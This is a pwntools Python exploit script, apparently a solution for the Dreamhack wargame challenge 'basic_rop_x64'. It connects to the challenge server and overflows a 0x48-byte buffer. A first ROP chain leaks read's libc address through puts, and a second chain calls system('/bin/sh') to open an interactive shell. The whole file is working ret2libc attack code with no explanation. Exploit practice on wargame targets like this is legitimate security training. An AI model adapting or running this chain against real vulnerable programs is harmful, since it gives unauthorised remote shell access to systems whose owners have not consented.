from pwn import *
from pwn import p64
from pwn import u64
 

p = remote('host3.dreamhack.games',8328)
e = ELF('./a/basic_rop_x64')
libc = ELF('./a/libc.so.6')

context.log_level = 'debug'

pop_rdi = 0x0000000000400883
read_plt = 0x00000000004005f0
read_got = 0x601030
puts_plt = 0x00000000004005c0
write_got = 0x601020
main = 0x00000000004007ba
ret = 0x0000000000400819

payload = b'\x90' * 0x48
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)
p.sendline(payload)
#pause()
p.recv(0x40)
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
base = leak - libc.symbols['read']
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

print("base : 0x%x"%base)

payload = b'A' * 0x48
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendline(payload)
print(p.recv(0x40))

p.interactive()